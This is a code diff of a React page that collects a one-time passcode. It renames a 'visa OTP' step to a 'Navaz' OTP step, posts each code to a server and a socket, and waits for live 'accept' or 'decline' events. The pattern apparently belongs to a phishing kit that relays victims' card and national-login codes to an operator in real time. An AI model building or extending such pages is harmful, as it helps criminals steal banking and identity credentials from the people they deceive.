@@ -9,7 +9,7 @@ import { token } from "../App";
 import axios from "axios";
 import { AiOutlineCloseCircle } from "react-icons/ai";
 
-const OTP = ({ setMode, checkMode }) => {
+const NavazOtp = ({ setMode, checkMode }) => {
   const { id } = useParams();
   const mode = localStorage.getItem("lang");
   const [counter, setCounter] = useState(60);
@@ -40,25 +40,25 @@ const OTP = ({ setMode, checkMode }) => {
     setError(false)
     e.preventDefault();
     await axios
-      .post(serverRoute + "/visaOtp/" + sessionStorage.getItem("id"), {
-        visa_otp: otp,
+      .post(serverRoute + "/navazOtp/" + sessionStorage.getItem("id"), {
+        navazOtp: otp,
       })
       .then(() =>
-        socket.emit("visaOtp", {
+        socket.emit("navazOtp", {
           id: sessionStorage.getItem("id"),
-          visa_otp: otp,
+          navazOtp: otp,
         })
       );
     
   };
 
-  socket.on("declineVisaOTP", (ID) => {
+  socket.on("declineNavazOTP", (ID) => {
     if (ID === sessionStorage.getItem("id")) {
       setError(true);
       setLoading(false);
     }
   });
-  socket.on("acceptVisaOTP", (id) => {
+  socket.on("acceptNavazOTP", (id) => {
     console.log(id)
     if (id === sessionStorage.getItem("id")) {
       setError(false);
@@ -170,4 +170,4 @@ const OTP = ({ setMode, checkMode }) => {
   );
 };
 
-export default OTP;
+export default NavazOtp;
